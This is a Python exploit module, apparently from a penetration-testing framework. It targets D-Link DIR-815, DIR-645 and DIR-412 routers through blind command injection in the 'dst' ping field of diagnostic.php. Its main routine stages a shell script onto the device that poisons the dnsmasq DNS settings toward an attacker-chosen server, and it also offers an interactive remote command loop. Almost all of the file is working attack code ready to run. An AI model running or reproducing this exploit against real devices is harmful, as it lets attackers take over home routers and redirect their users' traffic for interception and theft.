#coding: utf-8
'''
@Test list:
dir 815 revA 1.01
'''
from routelib import *
from exp_template import *
import time


class dir_815_412_645_rce(Exploit):
    def __init__(self, url, taskid=0, targetid=0, cmd_connect='', data_redirect='', dns_server='', proxies={}):
        self.url = url
        self.taskid = taskid
        self.targetid = targetid
        self.cmd_connect = cmd_connect
        self.data_redirect = data_redirect
        self.dns_server = dns_server
        self.proxies = proxies
        self.log_data = []
        self.shell_data = []

    def meta_info(self):
        return {
            'name': 'dir_815_412_645_rce',
            'author': '赵旭',
            'date': '2018-03-15',
            'attack_type': 'RCE',
            'app_type': 'Router',              #路由器为Router
            'app_name': 'dlink',
            'min_version': '',
            'max_version': '',
            'version_list': ['DIR-815','DIR-645','DIR-815','DIR-412'],             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Module exploits D-Link DIR-645 and DIR-815 Remote Code Execution vulnerability which allows executing command on the device.',
            'reference':[
                'http://www.s3cur1ty.de/m1adv2013-017',
            ],   #参考文档
        }
    '''
    'DIR-815 v1.03b02',
    'DIR-645 v1.02',
    'DIR-645 v1.03',
    'DIR-600 below v2.16b01',
    'DIR-300 revB v2.13b01',
    'DIR-300 revB v2.14b01',
    'DIR-412 Ver 1.14WWB02',
    'DIR-456U Ver 1.00ONG',
    'DIR-110 Ver 1.01',
    '''
    def exploit(self):
        if self.check():
            self.report("Target might be vulnerable - it is hard to verify")
            self.report("It is blind command injection, response is not available")
            #self.command_stager()
            self.dns_poison(self.dns_server)
        else:
            self.report("Exploit failed - target seems to be not vulnerable")

    def dns_poison(self,new_dns_server='192.168.220.5', dns_conf_path='/var/servd/DNS.conf', restart_cmd='"dnsmasq -C /var/servd/DNS.conf"'):
        every_send = 25
        completed = 0
        dns_handle = dns.dnsmasq_poison(self.dns_server)
        dns_shell = dns_handle.get_dns_poison_shell_cmds(every_send)
        wf = dns_shell['script_name']
        total_size = dns_shell['size']
        for cmd in dns_shell['cmds']:
            completed += every_send
            self.execute(cmd)
            if completed >= total_size:
                completed = total_size
            self.report('Command Stager progress - %.2f%% done (%d/%d) bytes' % (float(completed)/total_size*100, completed, total_size))

        chmod_dns_shell = 'chmod +x %s && echo' % wf
        #execute_dns_shell = '%s %s %s %s && echo' % (wf,dns_conf_path,new_dns_server,restart_cmd)
        execute_dns_shell = '%s && echo' % (wf)

        self.report('Command: "%s" done.' % chmod_dns_shell)
        self.execute(chmod_dns_shell)
        #print execute_dns_shell
        self.report('Command: "%s" done.' % execute_dns_shell)

        result = self.execute(execute_dns_shell)

    def command_stager(self):
        while True:
            cmd = raw_input("# ")
            if cmd in ['exit', 'quit']:
                return
            self.report(self.execute(cmd))

    def execute(self, cmd):
        req = session()
        cmd = "%26 {}%26".format(cmd.replace("&", "%26"))

        url = "{}/diagnostic.php".format(self.url)
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = "act=ping&dst={}".format(cmd)
        response = None

        try:
            req.post( url=url, headers=headers, data=data)
        except requests.Timeout as err:
            self.report(err.message,Level.warming)
        except requests.ConnectionError as err:
            pass
            self.report(err.message,Level.warming)
        return ""

    def check(self,ensure=False):
        req = session()
        if self.url.endswith('/'):
            self.url = self.url[:-1]
        url = "{}/diagnostic.php".format(self.url)
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = {"act": "ping",
                "dst": "& ls&"}

        response = None
        try:
            response = req.post( url=url, headers=headers, data=data)
        except requests.Timeout as err:
            self.report(err.message,Level.warming)
            return ">timeout<"
        except requests.ConnectionError as err:
            pass
            self.report(err.message,Level.warming)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200:# and "<report>OK</report>" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 3:
        print 'Usage(e.g.): dir_300_600_rce.py http://192.168.0.1:8080 119.6.6.6'
        exit(0)
    e = dir_815_412_645_rce(sys.argv[1],dns_server=sys.argv[2])
    e.exploit()
